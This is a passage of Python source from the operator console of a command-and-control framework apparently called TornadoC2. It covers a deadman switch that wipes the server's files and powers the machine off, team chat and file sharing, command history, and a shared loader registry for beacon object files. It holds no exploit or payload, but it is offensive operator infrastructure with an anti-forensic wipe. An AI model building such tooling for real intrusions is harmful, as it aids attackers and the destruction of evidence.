        warn = s.get('warn_fractions') or []
        row('warn at',
            ', '.join(f"{int(f * 100)}%" for f in warn) or 'none')
        row('last source', s.get('last_source', '?'))
        sources = s.get('sources') or {}
        if sources:
            print()
            print(f"  {c['dim']}activity by source:{c['reset']}")
            for src in sorted(sources, key=lambda k: -sources[k]):
                ts = sources[src]
                when = time.strftime('%H:%M:%S',
                                     time.localtime(ts))
                ago = self._fmt_seconds(time.time() - ts)
                print(f"    {c['cyan']}{src:<14}{c['reset']} "
                      f"{c['dim']}{when}  ({ago} ago){c['reset']}")

    def _deadman_post(self, verb, payload):
        c = CLR
        try:
            r = self.tp.post(f'/api/v1/deadman/{verb}', payload)
        except Exception as exc:
            print(f"{c['red']}deadman {verb} failed: {exc}"
                  f"{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}{r.get('error', 'failed')}"
                  f"{c['reset']}")
            return
        if verb in ('arm', 'reset'):
            print(f"{c['green']}✓ {'armed' if verb == 'arm' else 're-armed'}"
                  f" for {self._fmt_seconds(r.get('window_seconds', 0))}"
                  f"{c['reset']}")
        elif verb == 'arm-until':
            deadline = time.strftime(
                '%Y-%m-%d %H:%M:%S',
                time.localtime(r.get('deadline', 0)))
            print(f"{c['green']}✓ armed until {deadline} "
                  f"({self._fmt_seconds(r.get('window_seconds', 0))} "
                  f"from now){c['reset']}")
        elif verb == 'disable':
            print(f"{c['green']}✓ disabled (was "
                  f"{self._fmt_seconds(r.get('was', 0))})"
                  f"{c['reset']}")
        elif verb == 'warn':
            fracs = r.get('fractions') or []
            if fracs:
                joined = ', '.join(f"{int(f * 100)}%" for f in fracs)
                print(f"{c['green']}✓ warnings at {joined}"
                      f"{c['reset']}")
            else:
                print(f"{c['dim']}✓ warnings disabled{c['reset']}")
        elif verb == 'halt-mode':
            mode = r.get('mode') or 'none'
            print(f"{c['green']}✓ halt mode: {mode}{c['reset']}")
        elif verb == 'shred-mode':
            print(f"{c['green']}✓ shred mode: "
                  f"{r.get('mode', '?')}{c['reset']}")
        else:
            print(f"{c['green']}✓ done{c['reset']}")

    @staticmethod
    def _fmt_seconds(n):
        try:
            n = max(0.0, float(n))
        except (TypeError, ValueError):
            return '?'
        if n < 60:
            return f"{n:.0f}s"
        if n < 3600:
            return f"{n / 60:.1f}m"
        if n < 86400:
            return f"{n / 3600:.2f}h"
        return f"{n / 86400:.2f}d"

    def _cmd_halt(self, parts):
        """halt [--force]

        Run the shutdown sequence on the team server now: stop
        listeners, wipe the configured tree, run the configured
        power action, exit. Requires deadman.halt.
        """
        c = CLR
        if 'deadman.halt' not in self.caps:
            print(f"{c['red']}your role does not include "
                  f"deadman.halt{c['reset']}")
            return

        force = False
        for arg in parts[1:]:
            a = arg.lower()
            if a in ('--force', '-f'):
                force = True
            elif a in ('--help', '-h'):
                print(f"usage: halt [--force]")
                print(f"  {c['dim']}run the team server's shutdown "
                      f"sequence now.{c['reset']}")
                return
            else:
                print(f"{c['red']}unknown flag: {arg}{c['reset']}")
                return

        halt_mode = 'unknown'
        try:
            r = self.tp.post('/api/v1/deadman/status', {})
            if r.get('ok'):
                halt_mode = r.get('halt_mode', 'none')
        except Exception:
            pass

        if not force:
            if not sys.stdin.isatty():
                print(f"{c['red']}stdin is not a terminal; pass "
                      f"--force to confirm{c['reset']}")
                return
            print()
            print(f"  {c['yellow']}this will, on the team "
                  f"server:{c['reset']}")
            print(f"    - stop every listener")
            print(f"    - wipe the TornadoC2 tree")
            if halt_mode == 'reboot':
                print(f"    - {c['red']}reboot the machine{c['reset']}")
            elif halt_mode == 'shutdown':
                print(f"    - {c['red']}power off the machine{c['reset']}")
            else:
                print(f"    - exit the handler "
                      f"(halt mode is '{halt_mode}')")
            print()
            try:
                ans = input(
                    f"  {c['green']}proceed? [y/N]{c['reset']} "
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if ans not in ('y', 'yes'):
                print(f"{c['dim']}cancelled{c['reset']}")
                return

        try:
            r = self.tp.post('/api/v1/deadman/halt',
                             {'confirm': True}, timeout=10.0)
        except Exception as exc:
            print(f"{c['yellow']}halt dispatched; connection "
                  f"closed early ({exc}){c['reset']}")
            return

        if not r.get('ok'):
            print(f"{c['red']}{r.get('error', 'failed')}"
                  f"{c['reset']}")
            return

        print(f"{c['green']}✓ halt acknowledged "
              f"(mode={r.get('executing', 'none')}){c['reset']}")
        print(f"  {c['dim']}the team server will stop its listeners "
              f"within ~2 seconds.{c['reset']}")

    # ------------------------------------------------------------------
    # Team chat

    def _chat_render(self, msg, redraw=None):
        """Print one chat message without corrupting a partially
        typed line.

        Layout:
            14:32  alice  ❯ hello
            14:33  * alice staged the payload
            14:35  -- alice is typing --

        On a TTY with readline active, the current line is cleared,
        the message printed, and the prompt plus any partial input
        redrawn. Outside a TTY, falls back to a plain print. The
        prompt is only redrawn when the caller is the main thread —
        the poller renders on its own thread and cannot know what
        the main thread's buffer currently holds, so it never
        touches readline's state directly.
        """
        c = CLR
        kind = msg.get('kind', 'chat')
        ts = time.strftime('%H:%M',
                           time.localtime(msg.get('ts', 0)))

        # Day and system lines have no speaker.
        if kind == 'day':
            line = (f"{c['dim']}── {msg.get('text', '')} "
                    f"{'─' * 40}{c['reset']}")
            with _CHAT_OUTPUT_LOCK:
                self._chat_write_line(line, redraw=False)
            return
        if kind == 'system':
            line = (f"{c['dim']}{ts}  -- {msg.get('text', '')} --"
                    f"{c['reset']}")
            with _CHAT_OUTPUT_LOCK:
                self._chat_write_line(line, redraw=False)
            return
        if kind == 'notice':
            who = msg.get('operator', '?')
            text = msg.get('text', '')
            line = (f"{c['dim']}{ts}  -- {who} {text} --"
                    f"{c['reset']}")
            with _CHAT_OUTPUT_LOCK:
                self._chat_write_line(line, redraw=False)
            return
        if kind == 'file':
            who = msg.get('operator', '?')
            role = msg.get('role', '') or ''
            name = msg.get('text', 'file')
            size = int(msg.get('file_size', 0) or 0)
            digest = msg.get('file_hash', '') or ''
            hue = _chat_hue(who)
            speaker = f"{c[hue]}{who}{c['reset']}"
            role_tag = ''
            if role and role not in ('operator', 'local'):
                role_tag = f"{c['dim']}@{role}{c['reset']}"
            hash_field = (f"{c['dim']}sha256:{c['reset']}"
                          f"{digest}" if digest
                          else f"{c['dim']}sha256:?{c['reset']}")
            line = (f"{c['dim']}{ts}{c['reset']}  "
                    f"{speaker}{role_tag}  "
                    f"{c['cyan']}\U0001F4CE{c['reset']} "
                    f"{c['bold']}{name}{c['reset']} "
                    f"{c['dim']}({_human_bytes(size)})"
                    f"{c['reset']}  "
                    f"{hash_field}")
            with _CHAT_OUTPUT_LOCK:
                self._chat_write_line(line, redraw=False)
            return
        if kind == 'dm':
            recipient = msg.get('recipient', '?')
            sender = msg.get('operator', '?')
            text = msg.get('text', '')
            if sender == self.name:
                tag = f"dm \u2192 {recipient}"
                tag_color = c['magenta']
            else:
                tag = f"dm \u2190 {sender}"
                tag_color = c['yellow']
            line = (f"{c['dim']}{ts}{c['reset']}  "
                    f"{tag_color}[{tag}]{c['reset']}  "
                    f"{text}")
            with _CHAT_OUTPUT_LOCK:
                self._chat_write_line(line, redraw=False)
            return

        who = msg.get('operator', '?')
        role = msg.get('role', '') or ''
        text = msg.get('text', '')
        hue = _chat_hue(who)
        speaker = f"{c[hue]}{who}{c['reset']}"
        role_tag = ''
        if role and role not in ('operator', 'local'):
            role_tag = f"{c['dim']}@{role}{c['reset']}"

        body = _chat_highlight_mentions(text, self.name)

        if kind == 'action':
            # IRC-style: * speaker action.
            line = (f"{c['dim']}{ts}{c['reset']}  "
                    f"{c['dim']}*{c['reset']} "
                    f"{c['bold']}{speaker}{c['reset']}"
                    f"{role_tag}  "
                    f"{c['dim']}{body}{c['reset']}")
        else:
            line = (f"{c['dim']}{ts}{c['reset']}  "
                    f"{speaker}{role_tag}  "
                    f"{c['green']}❯{c['reset']} {body}")

        if redraw is None:
            redraw = (who != self.name)
        with _CHAT_OUTPUT_LOCK:
            self._chat_write_line(line, redraw=redraw)

    def _chat_render_topic(self, topic):
        """Render the pinned topic as a one-line banner.

        Called on entry (from the history response) and whenever
        the poller observes a change. Not rendered when the topic
        is empty, so a room without a topic looks no different
        from one where the topic was just cleared.
        """
        c = CLR
        text = (topic or {}).get('text', '') or ''
        if not text:
            return
        set_by = (topic or {}).get('set_by', '') or '?'
        set_at = (topic or {}).get('set_at', 0) or 0
        when = ''
        if set_at:
            when = ', ' + time.strftime(
                '%H:%M', time.localtime(set_at))

        hline = '\u2500' * 10
        line = (f"{c['dim']}\u2500\u2500 topic: {text} "
                f"(set by {set_by}{when}) "
                f"{hline}{c['reset']}")
        with _CHAT_OUTPUT_LOCK:
            self._chat_write_line(line, redraw=False)

    def _chat_write_line(self, line, redraw):
        """Emit one already-formatted line. When `redraw` is true
        and we are on a TTY with readline in the main thread,
        clear the current input line, print the message, and
        re-render the chat prompt with whatever the operator had
        typed.

        On the poller thread the full redraw is not safe —
        readline.redisplay() from another thread races the main
        thread's input() — but the message still must not be
        appended to the operator's prompt line. Clearing the
        line first moves the cursor to column 0 and produces a
        clean message; readline redraws its own prompt on the
        next keystroke. Without this, every incoming message is
        written after the prompt and typed text, then erased by
        readline on the next keypress.
        """
        is_tty = _COLOR and sys.stdout.isatty()
        if redraw and is_tty and readline \
                and threading.current_thread() is threading.main_thread():
            try:
                sys.stdout.write('\r\033[K')
                sys.stdout.write(line + '\n')
                buf = readline.get_line_buffer()
                sys.stdout.write(self._chat_prompt() + buf)
                sys.stdout.flush()
                try:
                    readline.redisplay()
                except Exception:
                    pass
                return
            except Exception:
                pass
        if is_tty:
            try:
                sys.stdout.write('\r\033[K')
            except Exception:
                pass
        print(line)

    def _chat_send_notice(self, event):
        """Broadcast a join or leave notice to the room.

        `event` is one of 'join' or 'leave'. The server owns the
        notice text; sending free-form text here would let this
        client forge a system line on every other operator's
        screen, and would equally let any other client forge one
        on ours. Failure is non-fatal — a notice is informational
        and the operator should still enter the room if the POST
        fails.
        """
        try:
            self.tp.post('/api/v1/chat/send',
                         {'kind': 'notice', 'event': event},
                         timeout=3.0)
        except Exception:
            pass

    def _chat_prompt(self):
        """Chat prompt. Readline-safe: ANSI codes wrapped in
        \001..\002 so they do not count toward prompt width."""
        c = CLR

        def esc(s):
            if _COLOR and readline:
                return '\001' + s + '\002'
            return s

        peer = getattr(self, '_chat_dm_peer', None)
        if peer:
            tag = (f"{esc(c['magenta'])}chat{esc(c['reset'])}"
                   f"{esc(c['dim'])}\u2192{esc(c['reset'])}"
                   f"{esc(c['yellow'])}{peer}{esc(c['reset'])}")
        else:
            tag = f"{esc(c['magenta'])}chat{esc(c['reset'])}"
        return (f"[{tag}] "
                f"{esc(c['cyan'])}{self.name}{esc(c['reset'])} "
                f"{esc(c['green'])}›{esc(c['reset'])} ")

    def _chat_help(self):
        """In-chat command menu. These are client-side only —
        the server does not know about slash commands. Anything
        else typed at the chat prompt is sent to every operator
        in the room."""
        c = CLR
        print(f"  {c['dim']}in-chat commands:{c['reset']}")
        print(f"    {c['green']}/me <text>{c['reset']}      send an "
              f"action (* your-name does something)")
        print(f"    {c['green']}/dm <name>{c['reset']}         "
              f"enter DM mode with <name>")
        print(f"    {c['green']}/dm <name> <text>{c['reset']}  "
              f"send one DM without entering DM mode")
        print(f"    {c['green']}/dm off{c['reset']}            "
              f"leave DM mode (back to broadcast)")
        print(f"    {c['green']}/topic{c['reset']}             "
              f"show the pinned topic")
        print(f"    {c['green']}/topic <text>{c['reset']}      "
              f"set the pinned topic")
        print(f"    {c['green']}/topic clear{c['reset']}       "
              f"clear the pinned topic")
        print(f"    {c['green']}/who{c['reset']}              "
              f"list operators at the chat prompt")
        print(f"    {c['green']}/history [N]{c['reset']}       "
              f"show last N messages (DM thread in DM mode, "
              f"room otherwise)")
        print(f"    {c['green']}/history --persist [N]{c['reset']} "
              f"read from the on-disk store; includes "
              f"messages from before the last server restart")
        print(f"    {c['green']}/history @<name> [N]{c['reset']}  "
              f"show last N DMs with <name>")
        print(f"    {c['green']}/history @<name> --persist [N]"
              f"{c['reset']}  the same, from disk")
        print(f"    {c['green']}/history @room [N]{c['reset']}   "
              f"show last N room messages (from inside DM mode)")
        print(f"    {c['green']}/file <path>{c['reset']}       share a "
              f"local file with the team")
        print(f"    {c['green']}/get <sha256> [<path>]{c['reset']}  "
              f"download a shared file")
        print(f"    {c['green']}/files{c['reset']}             "
              f"list shared files in the store")
        print(f"    {c['green']}/delete <sha256>{c['reset']}     "
              f"delete a file you uploaded")
        print(f"    {c['green']}/clear{c['reset']}            "
              f"clear the screen")
        print(f"    {c['green']}/help{c['reset']}             "
              f"this list")
        print(f"    {c['green']}/quit{c['reset']}             "
              f"leave chat")
        print(f"  {c['dim']}type @name to mention an operator. "
              f"anything else is broadcast, unless a DM peer "
              f"is active.{c['reset']}")
        print()
        print(f"  {c['yellow']}DM privacy:{c['reset']} "
              f"{c['dim']}a direct message is filtered out of every "
              f"other operator's client, but it is written to the "
              f"audit chain and to the chat log verbatim. Neither "
              f"party can deny having sent it — that is the point "
              f"of the audit chain. Do not use /dm for anything you "
              f"would not want an admin reading after the fact."
              f"{c['reset']}")

    def _cmd_chat(self, parts):
        """chat — enter team chat.

        Every line typed is broadcast to every operator connected
        to the team server. Incoming messages appear in real time.

        Messages are held in a bounded in-memory ring and mirrored
        to two on-disk files under logs/chat/ — a human-readable
        chat.txt for tail/grep, and a structured chat.jsonl that
        the server reloads on startup. The ring is what `/history`
        reads; the JSONL is what `/history --persist` reads. On a
        fresh server the two are identical; after a restart or
        during a long session, the JSONL reaches messages the ring
        has already rotated off.
        """
        c = CLR
        if 'chat.use' not in self.caps:
            print(f"{c['red']}your role does not include chat.use"
                  f"{c['reset']}")
            return

        self._chat_dm_peer = None
        self._chat_last_topic = None

        fetched = []
        history_topic = {}
        try:
            r = self.tp.post('/api/v1/chat/history',
                             {'limit': 200})
            fetched = list(r.get('messages') or [])
            history_topic = r.get('topic') or {}
        except Exception as exc:
            print(f"{c['dim']}(chat history unavailable: {exc})"
                  f"{c['reset']}")

        poller = _ChatPoller(self)

        topic_text = (history_topic or {}).get('text', '')
        if topic_text:
            self._chat_render_topic(history_topic)
        self._chat_last_topic = topic_text

        poller.seed_from_history(fetched)

        today_msgs = fetched[-15:]

        last_day = None
        for m in today_msgs:
            ts = m.get('ts')
            if ts is not None:
                day = _chat_day_label(ts)
                if day != last_day:
                    self._chat_render({
                        'operator': 'system',
                        'role':     '',
                        'kind':     'day',
                        'text':     day,
                        'ts':       ts,
                    }, redraw=False)
                    last_day = day
            self._chat_render(m, redraw=False)

        if not today_msgs:
            print(f"{c['dim']}entered team chat. no messages today. "
                  f"/help for commands, /quit to leave.{c['reset']}")
        else:
            n = len(today_msgs)
            noun = 'message' if n == 1 else 'messages'
            print(f"{c['dim']}entered team chat. showing {n} {noun} "
                  f"from today. /help for commands, /quit to "
                  f"leave.{c['reset']}")

        poller.start()

        self._chat_send_notice('join')
        self._chat_render({
            'operator': self.name,
            'role':     self.role,
            'kind':     'notice',
            'text':     'entered the room',
            'ts':       time.time(),
        })

        try:
            while True:
                try:
                    line = input(self._chat_prompt())
                except KeyboardInterrupt:
                    print()
                    break
                except EOFError:
                    print()
                    break
                line = line.rstrip()
                if not line:
                    continue

                if line.lower() in ('exit', 'quit'):
                    break

                if line.startswith('/'):
                    head = line[1:].split()
                    if not head:
                        continue
                    sub = head[0].lower()

                    if sub in ('quit', 'exit', 'q', 'leave'):
                        break

                    if sub in ('help', 'h', '?'):
                        self._chat_help()
                        continue

                    if sub == 'clear':
                        print('\033[2J\033[3J\033[H',
                              end='', flush=True)
                        continue

                    if sub == 'me':
                        if len(head) < 2:
                            print(f"{c['red']}usage: /me <text>"
                                  f"{c['reset']}")
                            continue
                        action = ' '.join(head[1:])
                        dm_peer = self._chat_dm_peer
                        if dm_peer:
                            body = {
                                'kind':      'dm',
                                'recipient': dm_peer,
                                'text':      action,
                            }
                            local = {
                                'operator':  self.name,
                                'role':      self.role,
                                'kind':      'dm',
                                'recipient': dm_peer,
                                'text':      action,
                                'ts':        time.time(),
                            }
                        else:
                            body = {
                                'text': action,
                                'kind': 'action',
                            }
                            local = {
                                'operator': self.name,
                                'role':     self.role,
                                'kind':     'action',
                                'text':     action,
                                'ts':       time.time(),
                            }
                        try:
                            self.tp.post('/api/v1/chat/send', body)
                        except Exception as exc:
                            print(f"{c['red']}send failed: {exc}"
                                  f"{c['reset']}")
                        self._chat_render(local)
                        continue

                    if sub == 'who':
                        try:
                            r = self.tp.post(
                                '/api/v1/chat/who', {})
                            ops = r.get('operators') or []
                        except Exception as exc:
                            print(f"{c['red']}{exc}{c['reset']}")
                            continue
                        if not ops:
                            print(f"  {c['dim']}no one at the "
                                  f"prompt{c['reset']}")
                            continue
                        print(f"  {c['dim']}at the chat prompt:"
                              f"{c['reset']}")
                        for o in ops:
                            oname = o.get('name', '?')
                            orole = o.get('role', '')
                            idle = float(o.get('idle_seconds', 0))
                            active = bool(o.get('active'))
                            hue = _chat_hue(oname)
                            if oname == self.name:
                                you = (f"{c['dim']} (you)"
                                       f"{c['reset']}")
                            else:
                                you = ''
                            if active:
                                state = (f"{c['green']}active"
                                         f"{c['reset']}")
                            else:
                                state = (f"{c['dim']}idle "
                                         f"{int(idle)}s"
                                         f"{c['reset']}")
                            print(f"    {c[hue]}{oname:<20}"
                                  f"{c['reset']} "
                                  f"{c['dim']}@{orole:<10}"
                                  f"{c['reset']} "
                                  f"{state}{you}")
                        continue

                    if sub in ('history', 'hist'):
                        n = 20
                        peer = None
                        persistent = False
                        for arg in head[1:]:
                            low = arg.lower()
                            if low in ('--persist', '-p',
                                       'persist', 'persistent'):
                                persistent = True
                            elif arg.startswith('@'):
                                peer = arg[1:]
                            else:
                                try:
                                    n = max(1, min(
                                        int(arg), 200))
                                except ValueError:
                                    pass

                        if peer == 'room':
                            peer = None
                            force_room = True
                        else:
                            force_room = False

                        if (peer is None and not force_room
                                and self._chat_dm_peer):
                            peer = self._chat_dm_peer

                        body = {'limit': n}
                        if peer:
                            body['peer'] = peer
                        if persistent:
                            body['persistent'] = True
                        try:
                            r = self.tp.post(
                                '/api/v1/chat/history', body)
                            msgs = r.get('messages') or []
                        except Exception as exc:
                            print(f"{c['red']}{exc}{c['reset']}")
                            continue
                        if persistent and peer:
                            print(f"  {c['dim']}DM history "
                                  f"with {peer} (persistent):"
                                  f"{c['reset']}")
                        elif persistent:
                            print(f"  {c['dim']}persistent "
                                  f"room history "
                                  f"(survives restart):"
                                  f"{c['reset']}")
                        elif peer:
                            print(f"  {c['dim']}DM history "
                                  f"with {peer}:{c['reset']}")
                        last_day = None
                        for m in msgs:
                            ts = m.get('ts')
                            if ts is not None:
                                day = _chat_day_label(ts)
                                if day != last_day:
                                    self._chat_render({
                                        'operator': 'system',
                                        'role':     '',
                                        'kind':     'day',
                                        'text':     day,
                                        'ts':       ts,
                                    }, redraw=False)
                                    last_day = day
                            self._chat_render(m, redraw=False)
                        continue

                    if sub == 'dm':
                        if len(head) < 2:
                            print(f"{c['red']}usage: /dm <name> "
                                  f"[<text>]  |  /dm off"
                                  f"{c['reset']}")
                            continue
                        target = head[1]
                        if target.lower() in ('off', 'exit',
                                              'leave', 'none'):
                            self._chat_dm_peer = None
                            print(f"{c['dim']}left DM mode — "
                                  f"back to broadcast{c['reset']}")
                            continue
                        if len(head) >= 3:
                            text = ' '.join(head[2:])
                            try:
                                self.tp.post(
                                    '/api/v1/chat/send',
                                    {'kind':      'dm',
                                     'recipient': target,
                                     'text':      text})
                            except Exception as exc:
                                print(f"{c['red']}send failed: "
                                      f"{exc}{c['reset']}")
                                continue
                            self._chat_render({
                                'operator':  self.name,
                                'role':      self.role,
                                'kind':      'dm',
                                'recipient': target,
                                'text':      text,
                                'ts':        time.time(),
                            })
                            continue
                        self._chat_dm_peer = target
                        print(f"{c['magenta']}entered DM mode "
                              f"with {target}{c['reset']} — "
                              f"{c['dim']}/dm off to leave"
                              f"{c['reset']}")
                        continue
                    if sub == 'files':
                        try:
                            r = self.tp.post(
                                '/api/v1/chat/files', {},
                                timeout=10.0)
                            rows = r.get('files') or []
                        except Exception as exc:
                            print(f"{c['red']}{exc}{c['reset']}")
                            continue
                        if not rows:
                            print(f"  {c['dim']}(no files in the "
                                  f"store){c['reset']}")
                            continue
                        _header(f'FILES  ·  {len(rows)}')
                        for f in rows:
                            h = f.get('sha256', '')
                            nm = f.get('name', '') or '?'
                            sz = _human_bytes(int(f.get('size', 0)))
                            owner = f.get('owner', '?')
                            ts = f.get('ts', 0)
                            when = time.strftime(
                                '%Y-%m-%d %H:%M',
                                time.localtime(ts)) if ts else '?'
                            print(f"  {c['cyan']}{h}{c['reset']}")
                            print(f"    {c['bold']}{nm:<32}"
                                  f"{c['reset']}  "
                                  f"{sz:>8}  "
                                  f"{c['dim']}{owner:<14} {when}"
                                  f"{c['reset']}")
                        print()
                        print(f"  {c['dim']}/get <sha256>  to "
                              f"download{c['reset']}")
                        print()
                        continue
                    if sub == 'file':
                        if len(head) < 2:
                            print(f"{c['red']}usage: /file <path>"
                                  f"{c['reset']}")
                            continue
                        path = ' '.join(head[1:])
                        try:
                            with open(path, 'rb') as fh:
                                data = fh.read()
                        except OSError as exc:
                            print(f"{c['red']}read failed: {exc}"
                                  f"{c['reset']}")
                            continue
                        if not data:
                            print(f"{c['red']}file is empty"
                                  f"{c['reset']}")
                            continue
                        import base64 as _b64
                        import os as _os
                        b64 = _b64.b64encode(data).decode('ascii')
                        fname = _os.path.basename(path) or 'file'
                        try:
                            r = self.tp.post(
                                '/api/v1/chat/file/upload',
                                {'name': fname, 'data_b64': b64},
                                timeout=120.0)
                        except Exception as exc:
                            print(f"{c['red']}upload failed: {exc}"
                                  f"{c['reset']}")
                            continue
                        if not r.get('ok'):
                            print(f"{c['red']}"
                                  f"{r.get('error', 'upload failed')}"
                                  f"{c['reset']}")
                            continue
                        m = r.get('message') or {}
                        if m:
                            self._chat_render(m)
                        if r.get('deduped'):
                            print(f"{c['dim']}(identical bytes "
                                  f"already in the store; "
                                  f"deduplicated){c['reset']}")
                        continue

                    if sub in ('delete', 'del', 'rm'):
                        if len(head) < 2:
                            print(f"{c['red']}usage: /delete "
                                  f"<sha256>{c['reset']}")
                            continue
                        digest = head[1].lower().strip()
                        try:
                            r = self.tp.post(
                                '/api/v1/chat/file/delete',
                                {'sha256': digest},
                                timeout=30.0)
                        except Exception as exc:
                            print(f"{c['red']}delete failed: "
                                  f"{exc}{c['reset']}")
                            continue
                        if not r.get('ok'):
                            print(f"{c['red']}"
                                  f"{r.get('error', 'delete failed')}"
                                  f"{c['reset']}")
                            continue
                        print(f"{c['green']}\u2713{c['reset']} "
                              f"deleted sha256:"
                              f"{digest[:12]}\u2026 "
                              f"({_human_bytes(r.get('size', 0))})")
                        continue

                    if sub in ('get', 'download'):
                        if len(head) < 2:
                            print(f"{c['red']}usage: /get <sha256> "
                                  f"[<path>]{c['reset']}")
                            continue
                        digest = head[1].lower().strip()
                        out_path = head[2] if len(head) > 2 else None

                        if out_path is None:
                            try:
                                hr = self.tp.post(
                                    '/api/v1/chat/history',
                                    {'limit': 500}, timeout=10.0)
                                for m in (hr.get('messages') or []):
                                    if m.get('kind') != 'file':
                                        continue
                                    if m.get('file_hash') != digest:
                                        continue
                                    cand = (m.get('text') or '').strip()
                                    cand = cand.replace('/', '_') \
                                               .replace('\\', '_')
                                    if cand and cand not in ('.', '..'):
                                        out_path = cand
                                    break
                            except Exception:
                                pass

                            if out_path is None:
                                try:
                                    fr = self.tp.post(
                                        '/api/v1/chat/files', {},
                                        timeout=10.0)
                                    for f in (fr.get('files') or []):
                                        if f.get('sha256') != digest:
                                            continue
                                        cand = (f.get('name')
                                                or '').strip()

                                        cand = (cand
                                                .replace('/', '_')
                                                .replace('\\', '_'))
                                        if cand and cand not in (
                                                '.', '..'):
                                            out_path = cand
                                        break
                                except Exception:
                                    pass
                            if out_path is None:
                                out_path = digest

                        try:
                            r = self.tp.post(
                                '/api/v1/chat/file/download',
                                {'sha256': digest},
                                timeout=120.0)
                        except Exception as exc:
                            print(f"{c['red']}download failed: "
                                  f"{exc}{c['reset']}")
                            continue
                        if not r.get('ok'):
                            print(f"{c['red']}"
                                  f"{r.get('error', 'not found')}"
                                  f"{c['reset']}")
                            continue
                        import base64 as _b64
                        import hashlib as _hl
                        try:
                            data = _b64.b64decode(
                                r.get('data_b64') or '')
                        except Exception:
                            print(f"{c['red']}bad response "
                                  f"encoding{c['reset']}")
                            continue

                        got = _hl.sha256(data).hexdigest()
                        if got != digest:
                            print(f"{c['red']}sha256 mismatch — "
                                  f"refusing to write{c['reset']}")
                            continue
                        if out_path is None:
                            out_path = digest
                        try:
                            with open(out_path, 'wb') as fh:
                                fh.write(data)
                        except OSError as exc:
                            print(f"{c['red']}write failed: {exc}"
                                  f"{c['reset']}")
                            continue
                        print(f"{c['green']}\u2713{c['reset']} "
                              f"saved {c['cyan']}{out_path}"
                              f"{c['reset']} "
                              f"({_human_bytes(len(data))})")
                        continue

                    if sub == 'topic':
                        if len(head) < 2:
                            try:
                                r = self.tp.post(
                                    '/api/v1/chat/topic', {})
                                t = r.get('topic') or {}
                            except Exception as exc:
                                print(f"{c['red']}{exc}"
                                      f"{c['reset']}")
                                continue
                            text = t.get('text', '')
                            if not text:
                                print(f"  {c['dim']}(no topic "
                                      f"set){c['reset']}")
                            else:
                                self._chat_render_topic(t)
                            continue
                        spec = ' '.join(head[1:]).strip()
                        if spec.lower() in ('clear', 'off',
                                            'none'):
                            spec = ''
                        try:
                            self.tp.post(
                                '/api/v1/chat/topic',
                                {'text': spec})
                        except Exception as exc:
                            print(f"{c['red']}topic set failed: "
                                  f"{exc}{c['reset']}")
                            continue
                        if spec:
                            self._chat_last_topic = spec
                            print(f"{c['green']}\u2713 topic set"
                                  f"{c['reset']}")
                        else:
                            self._chat_last_topic = ''
                            print(f"{c['dim']}\u2713 topic cleared"
                                  f"{c['reset']}")
                        continue

                    print(f"{c['red']}unknown /command: {sub} "
                          f"(try /help){c['reset']}")
                    continue

                if self._chat_dm_peer:
                    recipient = self._chat_dm_peer
                    try:
                        self.tp.post(
                            '/api/v1/chat/send',
                            {'kind':      'dm',
                             'recipient': recipient,
                             'text':      line})
                    except Exception as exc:
                        print(f"{c['red']}send failed: {exc}"
                              f"{c['reset']}")
                        continue
                    self._chat_render({
                        'operator':  self.name,
                        'role':      self.role,
                        'kind':      'dm',
                        'recipient': recipient,
                        'text':      line,
                        'ts':        time.time(),
                    })
                else:
                    try:
                        r = self.tp.post('/api/v1/chat/send',
                                         {'text': line})

                        msg = (r or {}).get('message')
                        if not isinstance(msg, dict):
                            msg = {
                                'operator': self.name,
                                'role':     self.role,
                                'kind':     'chat',
                                'text':     line,
                                'ts':       time.time(),
                            }
                        self._chat_render(msg)
                    except Exception as exc:
                        print(f"{c['red']}send failed: {exc}"
                              f"{c['reset']}")
        finally:
            poller.stop()
            self._chat_send_notice('leave')
            print(f"{c['dim']}left team chat{c['reset']}")

    # ------------------------------------------------------------------
    # Chat polling helper

    def _cmd_history(self, parts=None):
        """history [clear] [N]

        No arguments: show the last 50 commands.
        history N:    show the last N commands (1–500).
        history clear: wipe in-memory and on-disk history.
        """
        if not readline:
            print(f"{CLR['yellow']}readline is not available; "
                  f"command history is disabled.{CLR['reset']}")
            return

        parts = parts or []
        sub = parts[1].lower() if len(parts) > 1 else ''

        if sub == 'clear':
            n = readline.get_current_history_length()
            for _ in range(n):
                try:
                    readline.remove_history_item(0)
                except Exception:
                    break
            try:
                readline.write_history_file(HISTORY_FILE)
            except (OSError, IOError):
                pass
            print(f"{CLR['green']}history cleared{CLR['reset']}")
            return

        n = 50
        if sub.isdigit():
            n = max(1, min(int(sub), 500))
        elif len(parts) > 1:
            try:
                n = max(1, min(int(parts[1]), 500))
            except ValueError:
                pass

        total = readline.get_current_history_length()
        if total == 0:
            print(f"  {CLR['dim']}(no history){CLR['reset']}")
            return

        start = max(1, total - n + 1)

        c = CLR
        _header(f'HISTORY  ·  {total - start + 1} of {total} entries')
        for i in range(start, total + 1):
            item = readline.get_history_item(i)
            if not item:
                continue
            print(f"  {c['dim']}{i:>5}{c['reset']}  {item}")
        print()

    def _cmd_bofs(self, parts):
        """bofs list
           bofs add <path> [--as <name>] [--replace]
           bofs remove <name>

        `add` reads a local file (or directory) and uploads it to
        the server. Same parser as the standalone bofloader
        extension: .cna files are walked for bof()/script_resource()
        references, .o files are registered directly, and a
        directory imports everything it contains.

        The registry is shared: another operator who lists `bofs`
        sees every BOF you have added.
        """
        c = CLR
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls'):
            self._bofs_list()
            return

        if sub in ('remove', 'rm', 'delete', 'del'):
            if len(parts) < 3:
                print(f"{c['red']}usage: bofs remove <name>"
                      f"{c['reset']}")
                return
            self._bofs_remove(parts[2])
            return

        if sub == 'add':
            args = parts[2:]
            if not args:
                print(f"{c['red']}usage: bofs add <path> "
                      f"[--as <name>] [--replace]{c['reset']}")
                return
            as_name = None
            replace = False
            path = None
            i = 0
            while i < len(args):
                a = args[i]
                if a == '--as' and i + 1 < len(args):
                    as_name = args[i + 1]; i += 2; continue
                if a in ('--replace', '-r'):
                    replace = True; i += 1; continue
                if path is None:
                    path = a
                else:
                    print(f"{c['red']}unexpected argument: "
                          f"{a}{c['reset']}")
                    return
                i += 1
            if path is None:
                print(f"{c['red']}missing path{c['reset']}")
                return
            self._bofs_add(path, as_name, replace)
            return

        if sub in ('help', '?'):
            print(f"bofs list")
            print(f"bofs add <path> [--as <name>] [--replace]")
            print(f"bofs remove <name>")
            print(f"  {c['dim']}path may be a .cna, a .o/.obj, "
